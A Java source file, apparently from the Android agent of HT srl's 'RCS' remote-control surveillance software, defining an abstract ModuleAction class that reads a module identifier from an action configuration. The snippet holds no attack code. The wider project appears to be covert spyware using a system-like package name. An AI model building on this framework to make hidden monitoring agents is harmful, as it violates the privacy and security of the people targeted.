/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : StopAgentAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.action;

import java.io.IOException;

import org.json.JSONException;
import org.json.JSONObject;

import com.android.service.auto.Cfg;
import com.android.service.conf.ConfigurationException;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;

// TODO: Auto-generated Javadoc
/**
 * The Class StopAgentAction.
 */
abstract class ModuleAction extends SubAction {
	private static final String TAG = "AgentAction"; //$NON-NLS-1$

	protected String moduleId;

	/**
	 * Instantiates a new stop agent action.
	 * 
	 * @param jsubaction
	 *            the conf params
	 */
	public ModuleAction( final ActionConf jsubaction) {
		super( jsubaction);
	}

	@Override
	protected boolean parse(ActionConf params) {
		
		try {
			this.moduleId=params.getString("module");
		} catch (ConfigurationException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) Error: " + e);
			}
			return false;
		}
		
		return true;
	}

}
